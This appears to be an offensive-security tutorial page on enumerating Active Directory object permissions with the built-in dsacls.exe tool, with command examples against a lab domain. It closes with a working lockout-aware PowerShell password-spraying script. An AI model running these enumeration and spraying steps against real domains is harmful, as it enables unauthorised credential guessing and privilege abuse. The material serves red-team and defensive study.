---
description: Enumeration, living off the land
tags: [#enumeration]
---

# Enumerating AD Object Permissions with dsacls

It is possible to use a native windows binary (in addition to powershell cmdlet `Get-Acl`) to enumerate Active Directory object security persmissions. The binary of interest is `dsacls.exe`.

Dsacls allows us to display or modify permissions (ACLS) of an Active Directory Domain Services (AD DS).

## Execution

Let's check if user `spot` has any special permissions against user's `spotless` AD object:

```csharp
// attacker@victim
dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "spot"
```

Nothing useful:

![[Screenshot from 2019-03-19 22-46-47.png]]

Let's give user spot `Reset Password` and `Change Password` permissions on `spotless` AD object:

![[Screenshot from 2019-03-19 22-46-04.png]]

...and try the command again:

```csharp
// attacker@victim
dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "spot"
```

![[Screenshot from 2019-03-19 22-44-21.png]]

### Full Control

All well known (and abusable) AD object permissions should be sought here. One of them is `FULL CONTROL`:

```csharp
// attacker@victim
dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "full control"
```

![[Screenshot from 2019-03-19 22-54-36.png]]

### Add/Remove self as member

```csharp
// attacker@victim
dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" | select-string "spotless"
```

![[Screenshot from 2019-03-19 22-57-50.png]]

### WriteProperty/ChangeOwnerShip

![[Screenshot from 2019-03-19 23-00-04.png]]

Enumerating AD object permissions this way does not come in a nice format that can be piped between powershell cmd-lets, but it's still something to keep in mind if you do not the ability to use tools like powerview or ActiveDirectory powershell cmdlets or if you are trying to `LOL`.

For more good privileges to be abused:


[privileged-accounts-and-token-privileges.md](privileged-accounts-and-token-privileges.md)



[abusing-active-directory-acls-aces.md](abusing-active-directory-acls-aces.md)


## Password Spraying Anyone?

As a side note, the `dsacls` binary could be used to do LDAP password spraying as it allows us to bind to an LDAP session with a specified username and password:

```csharp
// incorrect logon
dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:spotless@offense.local /passwd:1234567
```

![[Screenshot from 2019-03-19 23-09-12.png|Logon Failure]]

```csharp
// correct logon
dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:spotless@offense.local /passwd:123456
```

![[Screenshot from 2019-03-19 23-09-59.png|Logon Successful]]

### Dirty POC idea for Password Spraying:

```csharp
// attacker@victim
$domain = ((cmd /c set u)[-3] -split "=")[-1]
$pdc = ((nltest.exe /dcname:$domain) -split "\\\\")[1]
$lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1]
$password = "123456"

# (Get-Content users.txt)
"krbtgt","spotless" | % {
    $badPwdCount = Get-ADObject -SearchBase "cn=$_,cn=users,dc=$domain,dc=local" -Filter * -Properties badpwdcount -Server $pdc | Select-Object -ExpandProperty badpwdcount
    if ($badPwdCount -lt $lockoutBadPwdCount - 3) {
        $isInvalid = dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:$_@offense.local /passwd:$password | select-string -pattern "Invalid Credentials"
        if ($isInvalid -match "Invalid") {
            Write-Host "[-] Invalid Credentials for $_ : $password" -foreground red
        } else {
            Write-Host "[+] Working Credentials for $_ : $password" -foreground green
        }        
    }
}
```

![[Screenshot from 2019-03-20 00-10-10.png]]

## References

[support.microsoft.com/en-gb/help/281146/how-to-use-dsacls-exe-in-windows-server-2003-and-windows-2000](https://support.microsoft.com/en-gb/help/281146/how-to-use-dsacls-exe-in-windows-server-2003-and-windows-2000)

